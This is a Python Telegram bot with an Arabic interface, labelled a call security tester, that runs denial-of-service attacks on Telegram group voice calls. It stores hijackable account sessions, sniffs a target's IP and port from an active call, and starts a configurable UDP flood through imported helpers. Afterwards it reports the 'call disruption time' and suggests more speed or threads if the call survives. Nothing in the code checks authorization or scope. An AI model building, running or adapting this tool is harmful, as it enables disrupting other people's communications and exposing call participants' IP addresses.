#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Telegram Call Security Tester Bot
بوت متكامل لاختبار المكالمات الجماعية
"""

import asyncio
import logging
import time
from datetime import datetime
from typing import Dict

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, ConversationHandler,
    ContextTypes, MessageHandler, filters
)

from config import BOT_TOKEN, API_ID, API_HASH
from utils import (
    load_sessions, add_session, remove_session, login_telegram, get_client,
    extract_target_from_call, UDPFlood, DATA_DIR
)

# إعداد التسجيل
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# مراحل المحادثة
(WAITING_PHONE, WAITING_CODE, WAITING_2FA, WAITING_CHAT_ID,
 WAITING_SPEED, WAITING_PACKETS, WAITING_PPS, WAITING_THREADS,
 WAITING_DURATION, WAITING_INTERFACE) = range(10)

# تخزين بيانات المستخدم المؤقتة
user_data: Dict[int, dict] = {}

# ============================== القوائم والأزرار ==============================
def main_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ إضافة حساب", callback_data="add_account")],
        [InlineKeyboardButton("📋 الحسابات المخزنة", callback_data="list_accounts")],
        [InlineKeyboardButton("🗑️ حذف حساب", callback_data="remove_account")],
        [InlineKeyboardButton("🎤 هجوم DoS", callback_data="dos_attack")],
        [InlineKeyboardButton("📊 الحالة", callback_data="status")],
    ]
    return InlineKeyboardMarkup(keyboard)

def back_button():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="back")]])

# ============================== الأوامر الرئيسية ==============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎯 **بوت اختبار المكالمات الجماعية**\n\n"
        "اختر من القائمة أدناه:",
        reply_markup=main_menu_keyboard(),
        parse_mode="Markdown"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "back":
        await query.edit_message_text(
            "🎯 **القائمة الرئيسية**",
            reply_markup=main_menu_keyboard(),
            parse_mode="Markdown"
        )

    elif data == "add_account":
        user_data[query.from_user.id] = {"step": "phone"}
        await query.edit_message_text(
            "📱 **إضافة حساب جديد**\n\n"
            "الرجاء إرسال رقم الهاتف مع مفتاح الدولة.\n"
            "مثال: +966501234567",
            reply_markup=back_button()
        )

    elif data == "list_accounts":
        sessions = load_sessions()
        if not sessions:
            text = "📭 **لا توجد حسابات مخزنة.**"
        else:
            text = "**📋 الحسابات المخزنة:**\n\n"
            for phone, info in sessions.items():
                name = info.get("name", phone)
                added = datetime.fromtimestamp(info.get("added_at", 0)).strftime("%Y-%m-%d %H:%M")
                text += f"• **{name}**\n  📞 `{phone}`\n  🕐 {added}\n\n"
        await query.edit_message_text(text, reply_markup=back_button(), parse_mode="Markdown")

    elif data == "remove_account":
        sessions = load_sessions()
        if not sessions:
            await query.edit_message_text("📭 لا توجد حسابات لحذفها.", reply_markup=back_button())
            return
        keyboard = []
        for phone, info in sessions.items():
            name = info.get("name", phone)
            keyboard.append([InlineKeyboardButton(f"❌ {name}", callback_data=f"remove_{phone}")])
        keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="back")])
        await query.edit_message_text(
            "**🗑️ اختر الحساب لحذفه:**",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )

    elif data.startswith("remove_"):
        phone = data.replace("remove_", "")
        if await remove_session(phone):
            await query.edit_message_text(f"✅ تم حذف الحساب {phone}", reply_markup=back_button())
        else:
            await query.edit_message_text("❌ فشل حذف الحساب", reply_markup=back_button())

    elif data == "dos_attack":
        sessions = load_sessions()
        if not sessions:
            await query.edit_message_text("❌ لا توجد حسابات. أضف حساباً أولاً.", reply_markup=back_button())
            return
        keyboard = []
        for phone, info in sessions.items():
            name = info.get("name", phone)
            keyboard.append([InlineKeyboardButton(name, callback_data=f"attack_select_{phone}")])
        keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="back")])
        await query.edit_message_text(
            "**🎤 هجوم DoS**\n\nاختر الحساب الذي سينفذ الهجوم:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )

    elif data.startswith("attack_select_"):
        phone = data.replace("attack_select_", "")
        user_data[query.from_user.id] = {"step": "waiting_interface", "phone": phone}
        await query.edit_message_text(
            "🌐 **أدخل واجهة الشبكة**\n\n"
            "واجهات الشبكة المتاحة: wlan0, eth0, rmnet0\n"
            "الأكثر استخداماً: wlan0",
            reply_markup=back_button()
        )

    elif data == "status":
        sessions = load_sessions()
        text = "**📊 حالة الحسابات:**\n\n"
        for phone, info in sessions.items():
            name = info.get("name", phone)
            text += f"• **{name}**\n  📞 `{phone}`\n\n"
        await query.edit_message_text(text, reply_markup=back_button(), parse_mode="Markdown")

# ============================== معالجات المحادثة ==============================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    if user_id not in user_data:
        await update.message.reply_text("❌ لا توجد عملية نشطة. استخدم /start")
        return

    state = user_data[user_id].get("step")

    # إضافة حساب جديد
    if state == "phone":
        phone = text.strip()
        user_data[user_id]["phone"] = phone
        user_data[user_id]["step"] = "waiting_code"

        async def code_callback():
            return await get_code_response(update, context)

        success, session_string, name, error = await login_telegram(phone)
        if success:
            await add_session(phone, session_string, name)
            await update.message.reply_text(f"✅ تم إضافة الحساب {name} بنجاح!")
            del user_data[user_id]
        else:
            await update.message.reply_text(f"❌ فشل تسجيل الدخول: {error}")

    # هجوم DoS - اختيار واجهة الشبكة
    elif state == "waiting_interface":
        interface = text.strip()
        user_data[user_id]["interface"] = interface
        user_data[user_id]["step"] = "waiting_chat_id"
        await update.message.reply_text(
            "📌 **أدخل معرف المجموعة (chat_id)**\n\nمثال: -100123456789\n"
            "يمكنك الحصول عليه من @userinfobot",
            parse_mode="Markdown"
        )

    elif state == "waiting_chat_id":
        try:
            chat_id = int(text)
            user_data[user_id]["chat_id"] = chat_id
            user_data[user_id]["step"] = "waiting_extract"
            await update.message.reply_text(
                "🔍 **جاري استخراج الـ IP من المكالمة...**\n"
                "الرجاء التأكد من أن الحساب صاعد في المكالمة الصوتية.",
                parse_mode="Markdown"
            )

            phone = user_data[user_id]["phone"]
            interface = user_data[user_id]["interface"]

            # محاولة استخراج الـ IP والمنفذ
            target_ip, target_port = await extract_target_from_call(interface, timeout=30)

            if not target_ip:
                await update.message.reply_text(
                    "❌ **فشل استخراج الـ IP**\n\n"
                    "تأكد من:\n"
                    "1. الحساب صاعد في المكالمة\n"
                    "2. المكالمة نشطة\n"
                    "3. واجهة الشبكة صحيحة",
                    parse_mode="Markdown"
                )
                del user_data[user_id]
                return

            user_data[user_id]["target_ip"] = target_ip
            user_data[user_id]["target_port"] = target_port

            await update.message.reply_text(
                f"✅ **تم استخراج الهدف بنجاح!**\n\n"
                f"🌐 **IP الهدف:** `{target_ip}`\n"
                f"🔌 **المنفذ:** `{target_port}`\n\n"
                f"⚡ **أدخل سرعة الهجوم (أمر/ثانية):**\n"
                f"السرعة الموصى بها: 5-10",
                parse_mode="Markdown"
            )
            user_data[user_id]["step"] = "waiting_speed"

        except ValueError:
            await update.message.reply_text("❌ معرف غير صالح. حاول مرة أخرى:")

    elif state == "waiting_speed":
        try:
            speed = float(text)
            user_data[user_id]["speed"] = speed
            user_data[user_id]["step"] = "waiting_packets"
            await update.message.reply_text(
                "📦 **أدخل عدد الحزم لكل حساب:**\n"
                "العدد الموصى به: 50-200",
                parse_mode="Markdown"
            )
        except ValueError:
            await update.message.reply_text("❌ قيمة غير صالحة. حاول مرة أخرى:")

    elif state == "waiting_packets":
        try:
            packets = int(text)
            user_data[user_id]["packets"] = packets
            user_data[user_id]["step"] = "waiting_pps"
            await update.message.reply_text(
                "⚡ **أدخل حد الحزم في الثانية (PPS):**\n"
                "0 = بدون حد\n"
                "الحد الموصى به: 500-2000",
                parse_mode="Markdown"
            )
        except ValueError:
            await update.message.reply_text("❌ قيمة غير صالحة. حاول مرة أخرى:")

    elif state == "waiting_pps":
        try:
            pps = int(text)
            user_data[user_id]["pps"] = pps
            user_data[user_id]["step"] = "waiting_threads"
            await update.message.reply_text(
                "🧵 **أدخل عدد الخيوط (threads):**\n"
                "العدد الموصى به: 5-20",
                parse_mode="Markdown"
            )
        except ValueError:
            await update.message.reply_text("❌ قيمة غير صالحة. حاول مرة أخرى:")

    elif state == "waiting_threads":
        try:
            threads = int(text)
            user_data[user_id]["threads"] = threads
            user_data[user_id]["step"] = "waiting_duration"
            await update.message.reply_text(
                "⏱️ **أدخل مدة الهجوم بالثواني:**\n"
                "المدة الموصى بها: 30-120",
                parse_mode="Markdown"
            )
        except ValueError:
            await update.message.reply_text("❌ قيمة غير صالحة. حاول مرة أخرى:")

    elif state == "waiting_duration":
        try:
            duration = int(text)
            phone = user_data[user_id]["phone"]
            target_ip = user_data[user_id]["target_ip"]
            target_port = user_data[user_id]["target_port"]
            speed = user_data[user_id]["speed"]
            packets = user_data[user_id]["packets"]
            pps = user_data[user_id]["pps"]
            threads = user_data[user_id]["threads"]

            await update.message.reply_text(
                f"🚀 **بدء الهجوم...**\n\n"
                f"🎯 الهدف: `{target_ip}:{target_port}`\n"
                f"⚡ السرعة: {speed} أمر/ثانية\n"
                f"📦 الحزم: {packets}\n"
                f"⚡ PPS: {pps}\n"
                f"🧵 الخيوط: {threads}\n"
                f"⏱️ المدة: {duration} ثانية\n\n"
                f"🔴 **الهجوم قيد التنفيذ...**",
                parse_mode="Markdown"
            )

            # التحقق من أن الحساب صاعد في المكالمة
            client = await get_client(phone)
            if not client:
                await update.message.reply_text("❌ فشل الاتصال بالحساب")
                del user_data[user_id]
                return

            # تسجيل وقت بدء الهجوم
            start_time = time.time()

            # بدء هجوم UDP Flood
            flooder = UDPFlood(target_ip, target_port, duration, 1024, threads, pps)
            total_packets, elapsed = flooder.start()

            # حساب وقت الانقطاع
            end_time = time.time()
            disruption_time = end_time - start_time

            await update.message.reply_text(
                f"✅ **انتهى الهجوم!**\n\n"
                f"📊 **النتائج:**\n"
                f"📦 إجمالي الحزم المرسلة: {total_packets}\n"
                f"⏱️ مدة الهجوم الفعلية: {elapsed:.2f} ثانية\n"
                f"🔥 **وقت تعطيل المكالمة: {disruption_time:.2f} ثانية**\n\n"
                f"⚠️ إذا كانت المكالمة لا تزال تعمل، جرب زيادة السرعة أو عدد الخيوط.",
                parse_mode="Markdown"
            )

            # إنهاء الجلسة
            await client.stop()
            del user_data[user_id]

        except ValueError:
            await update.message.reply_text("❌ قيمة غير صالحة. حاول مرة أخرى:")

async def get_code_response(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """دالة مساعدة للحصول على كود التفعيل من المستخدم"""
    # هذه الدالة تستخدم داخل login_telegram
    # سنقوم بتنفيذها بشكل مختلف
    pass

# ============================== التشغيل ==============================
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("🤖 البوت يعمل...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()